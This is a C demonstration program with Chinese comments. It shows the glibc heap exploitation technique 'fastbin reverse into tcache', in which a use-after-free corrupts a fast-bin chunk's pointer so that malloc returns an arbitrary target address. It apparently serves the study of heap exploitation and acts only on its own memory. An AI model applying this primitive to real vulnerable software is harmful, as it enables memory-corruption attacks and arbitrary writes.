/**
 *  漏洞名称： fastbin reverse into tcache
 *  适用版本： glibc-2.23 ~ glibc-2.39
 *  漏洞危害： 实现和unsorted_bin_attack类似的效果，
 *            可以实现任意地址分配出来，不同于fastbin_dup，这里不需要设置目标地址的值来满足条件
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache
 */

/**
 *  利用条件：  存在UAF漏洞
 *  利用思路:   填充fast bin
 *             修改fast bin的第7个chunk(victim)的fd指针，使其指向target
 *             将fast bin对应的tcache bin清空，再次分配一次fast bin中的chunk，即可修改target=victim，并将目标地址放入tcache bin中
 *             再次分配一次，即可将目标地址分配出来
 */
#define DEMO
#include <demo.h>

const size_t allocsize = 0x40;

int main()
{
    u64 target[6];
    memset(target, 0xcd, sizeof(target));

    DEBUG("1.分配7 + 1 + 6个chunk\n");
    u64 chunk[14];
    for (int i = 0; i < 14; i++)
    {
        chunk[i] = MALLOC(allocsize);
    }

    DEBUG("2.填充tcache bin\n");
    for (int i = 0; i < 7; i++)
    {
        FREE(chunk[i]);
    }

    DEBUG("3.将需要UAF的chunk释放\n");
    u64 victim = chunk[7];
    FREE(victim);

    DEBUG("4.填充fast bin, 使victim位于fast bin的第七个\n");
    for (int i = 8; i < 14; i++)
    {
        FREE(chunk[i]);
    }

    DEBUG("5.设置victim指向target\n");
    u64 fd = PROTECT_FD(victim, target);
    SET_ADDR_OFFSET_VALUE(victim, 0x0, fd);

    DEBUG("6.清空tcache bin\n");
    for (int i = 0; i < 7; i++)
        chunk[i] = MALLOC(allocsize);

    DEBUG("7.再进行一次malloc, 即可将fast bin中的chunk放入tcache bin中, 并修改target = victim\n");
    MALLOC(allocsize);

    DEBUG("8.再进行一次malloc, 即将目标地址分配出来\n");
    u64 new_chunk = MALLOC(allocsize) - 0x10;
    PUT_VALUE("分配出来的地址", new_chunk);
    PUT_VALUE("target的地址", target);

    assert((u64)target == (u64)(new_chunk));

    return 0;
}